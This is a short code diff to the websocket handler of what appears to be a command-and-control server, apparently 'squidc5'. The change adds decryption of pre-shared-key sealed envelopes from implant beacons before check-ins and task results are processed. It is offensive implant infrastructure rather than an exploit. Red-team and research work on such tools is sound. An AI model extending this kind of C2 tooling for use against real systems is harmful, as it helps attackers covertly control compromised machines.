@@ -51,14 +51,31 @@ async def _ws_loop(websocket: WebSocket) -> None:
     try:
         while True:
             msg: dict[str, Any] = await websocket.receive_json()
-            kind = str(msg.get("type") or "beacon")
+            # C06: sealed envelopes put type inside ciphertext — unwrap first
+            from squidc5.implants.crypto import is_envelope, open_envelope
+
+            inner = msg
+            if is_envelope(msg):
+                psk = getattr(state, "implant_psk", "") or ""
+                require = bool(getattr(state.settings, "implant_require_auth", True))
+                if require or psk:
+                    try:
+                        if not psk:
+                            raise PermissionError("PSK missing")
+                        inner = open_envelope(psk, msg)
+                    except Exception:
+                        await websocket.close(code=1008)
+                        return
+            kind = str(inner.get("type") or msg.get("type") or "beacon")
+            # process_* also unwraps; pass original envelope when sealed for auth
+            wire = msg if is_envelope(msg) else inner
             if kind == "result":
-                out = await process_beacon_result(state, msg)
+                out = await process_beacon_result(state, wire)
             else:
                 out = await process_beacon_checkin(
                     state,
                     remote_addr=client,
-                    payload=msg,
+                    payload=wire,
                     user_agent="ws-beacon",
                 )
             await websocket.send_json(out)
